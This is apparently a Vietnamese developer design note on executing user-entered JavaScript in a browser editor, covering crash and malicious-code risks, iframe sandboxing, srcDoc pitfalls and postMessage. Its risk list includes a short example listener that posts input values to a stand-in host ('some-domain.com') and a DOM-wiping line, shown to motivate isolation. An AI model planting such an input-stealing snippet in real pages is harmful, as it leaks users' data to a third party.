# Execute Code

Phần này mô tả các vấn đề và cách thực hiện run code của user nhập vào textarea.

### Một số vấn đề gặp phải

1. Code của user có thể bị lỗi syntax dẫn đến crash app.

Ví dụ: `console.abc();`

2. User có thể thêm các dòng code để thay đổi cấu trúc DOM, nó cũng có thể gây crash app

Ví dụ: `document.body.innerHTML = ""`;

3. Đoạn code user thêm vào có thể chứa mã độc, nhằm đánh cắp thông tin hoặc các mục đích khác.

Ví dụ:

```
document.querySelector('input').addEventListener('change', event => {
    axios.post('some-domain.com', {
        value: event.target.value
    })
})
```

### Cách khắc phục

Tham khảo các website edit code online như `codesandbox`, `codepen` thì tại component hiển thị code người ta sử dụng một thẻ `iframe` để hiển thị code của user nhập vào.

Thẻ `iframe` tạo ra một document khác bên trong document hiện tại, 2 context này thực thi code javascript độc lập với nhau.

Tuy nhiên, giữa document cha và thẻ iframe vẫn có thể tương tác được với object window của nhau khi thoả 2 điều kiện sau:

1. Thẻ `iframe` có KO có attribute `sanbox` hoặc có giá trị `sanbox="allow-same-origin"`
2. Parent HTML và iframe có chung Domain, Port và Protocol (http hoặc https);

Cách tương tác như sau:

- Trong thẻ `iframe`, sử dụng biến global `parent` để tham chiếu đến window object của document cha.
- Trong document cha, query đến element iframe và access vào thuộc tính `contentWindow` để tham chiếu đến window object của iframe.

Khi sử dụng iframe, các vấn đề ở trên đều được giải quyết bởi vì tất các code Javascript được thực hiện ở iframe và không liên quan đến parent document.

### Các vấn đề khác

- Để iframe có thể nhận được code Javascript từ document cha, sử dụng thuộc tính `srcDocs` của iframe element, đồng thời set giá trị của thuộc tính `sandbox="allow-scripts"`.

- Khi sử dụng thuộc tính `srcDocs` của thẻ iframe để truyền JS, tất cả code sau khi bundle sẽ được đưa vào thuộc tính này và nó có nguy cơ gây lỗi nếu string code bundle quá dài (trường hợp chúng ta import những package có dung lượng lớn).

- Cách truyền code JS vào thẻ iframe là tạo một content HTML với cấu trúc như sau.

```
const html = `
    <script>
        ${code}
    </script>
`
```

Tuy nhiên, trong một số thư viện có thể xuất hiện thẻ đóng mở `<script>...<script>`. Dẫn đến content của biến html sẽ bị chia làm 2, một phần vẫn hiển thị đúng trong thẻ `<script>`, phần còn lại sẽ hiển trị như là html content bên trong body.

Ví dụ: `import ReactDOM from 'react-dom'` --> sẽ gặp lỗi như trên.

**Để xử lý 2 lỗi ở trên, ta phải thay đổi cách tương tác giữa parent document và iframe.**

Mặc dù chúng ta đã thêm thuộc tính `sandbox="allow-scripts"` vào thẻ iframe nhằm mục đích chỉ cho phép tương tác bằng script giữa parent và iframe, tuy nhiên vẫn còn 1 cách khác để có thể tương tác và truyền dữ liệu. Đó là sử dụng `window.postMessage()` function.

Trong thẻ iframe, addEventListener `message`, sau đó từ parent document sử dụng postMessage để truyền code content vào thẻ iframe, đoạn code này ko có thẻ đóng mở script như cách dùng thuộc tính `srcDoc`.
